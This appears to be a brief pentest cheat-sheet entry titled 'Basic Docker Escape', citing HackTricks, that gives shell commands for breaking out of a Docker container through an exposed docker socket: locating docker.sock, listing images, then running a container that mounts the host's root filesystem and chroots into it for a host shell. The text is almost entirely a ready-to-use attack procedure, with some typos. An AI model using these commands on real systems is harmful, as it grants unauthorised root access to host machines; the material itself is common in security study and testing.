## Basic Docker Escape:

https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout

```sh
#See if you have access to the docker Socket
find / -name docker.sock 2>/dev/null

#Run a test command to see if you can interface, while gathering image names
docker images

#Now run some magic, make sure host name is the same name as the image you are logged into:
docker run -it -v /:/host/ HOST chroot /host/ bash

note: you can get your HOST from the docker images command and an lsb-realease serach, also the docker command might give you the same info
```